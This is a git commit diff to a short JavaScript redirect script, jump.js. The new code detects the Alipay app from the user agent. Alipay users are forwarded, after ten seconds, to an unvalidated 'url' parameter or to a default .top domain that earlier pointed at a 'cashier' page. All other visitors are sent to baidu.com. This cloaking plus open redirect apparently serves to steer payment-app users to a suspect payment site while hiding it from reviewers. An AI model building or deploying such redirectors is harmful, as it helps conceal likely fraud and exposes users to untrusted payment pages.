db6e55ba4d7d154f831750929e07d0bf97c4b5c2
faker548 <gpt2023041402@protonmail.com>
2025-07-17 23:33:18 +0800

    Update jump.js

--- jump.js
+++ jump.js
@@ -1,10 +1,19 @@
 (() => {
-	const urlParams = new URLSearchParams(window.location.search);
-	let openUrl = urlParams.get('url');
-	if (openUrl == undefined || openUrl == null || openUrl == '') {
-		openUrl = "https://www.nzduojin002.top/cashier.html";
+	function isAlipay() {
+		const ua = navigator.userAgent;
+		return /AlipayClient|AliApp/.test(ua);
 	}
-	setTimeout(() => {
-		location.href = openUrl;
-	}, 10000);
+	// 使用示例：
+	if (isAlipay()) {
+		const urlParams = new URLSearchParams(window.location.search);
+		let openUrl = urlParams.get('url');
+		if (openUrl == undefined || openUrl == null || openUrl == '') {
+			openUrl = "https://www.nzduojin002.top";
+		}
+		setTimeout(() => {
+			location.href = openUrl;
+		}, 10000);
+	} else {
+		location.href = "https://www.baidu.com";
+	}
 })();
